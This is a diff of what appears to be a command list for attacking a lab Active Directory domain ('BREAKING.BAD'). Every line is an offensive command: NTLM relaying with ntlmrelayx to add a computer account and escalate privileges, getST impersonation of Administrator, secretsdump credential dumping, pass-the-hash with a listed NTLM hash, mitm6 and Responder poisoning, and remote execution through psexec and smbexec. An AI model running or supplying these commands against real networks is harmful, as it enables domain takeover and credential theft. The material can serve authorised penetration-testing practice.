@@ -14,10 +14,10 @@ dementor -d breaking.bad -u anonymous -p anonymous 192.168.56.1 DC02.BREAKING.BA
 ntlmrelayx -t ldaps://DC01.BREAKING.BAD -smb2support --add-computer SHUTDOWN --delegate-access
 ntlmrelayx -t ldaps://DC01.BREAKING.BAD -smb2support --remove-mic --add-computer SHUTDOWN --delegate-access
 ntlmrelayx -t ldaps://DC01.BREAKING.BAD -smb2support --remove-mic --add-computer SHUTDOWN 123soleil --delegate-access
+ntlmrelayx -t ldap://DC01.BREAKING.BAD -smb2support --escalate-user SHUTDOWN
 getST.py -spn host/DC02.BREAKING.BAD 'BREAKING.BAD/SHUTDOWN$:123soleil' -impersonate Administrator -dc-ip 192.168.56.101
 getST.py -spn host/SV01.BREAKING.BAD 'BREAKING.BAD/SHUTDOWN$:123soleil' -impersonate Administrator -dc-ip 192.168.56.101
-secretsdump -k -no-pass -just-dc DC02.BREAKING.BAD
-secretsdump -k -no-pass DC02.BREAKING.BAD
+secretsdump -k DC02.BREAKING.BAD
 secretsdump -just-dc hashes :a88baa3fdc8f581ee0fb05d7054d43e4 BREAKING.BAD/Administrator@dc01.breaking.bad
 rpcclient -U "" -N DC01.BREAKING.BAD
 pth-net rpc group members "Domain admins" -U BREAKING.BAD/Administrator%ffffffffffffffffffffffffffffffff:a88baa3fdc8f581ee0fb05d7054d43e4 -S DC01.BREAKING.BAD
@@ -26,7 +26,7 @@ cme smb 192.168.56.0/24 --gen-relay-list smbrelay_targets.txt
 crackmapexec smb 192.168.56.0/24 --gen-relay-list smbrelay_targets.txt
 mitm6 --ignore-nofqdn --interface eth0
 responder --interface eth0 --wredir --NBTNSdomain --wpad --lm --ProxyAuth --ForceWpadAuth
-ntlmrelayx -6 -smb2support -tf smbrelay_targets.txt -socks
+ntlmrelayx -tf targets.txt -w -6 -smb2support -socks
 proxychains secretsdump -no-pass BREAKING/Administrator@SV01.BREAKING.BAD
 proxychains smbexec.py -no-pass BREAKING/Administrator@SV01.BREAKING.BAD
 proxychains psexec.py -no-pass BREAKING/Administrator@SV01.BREAKING.BAD
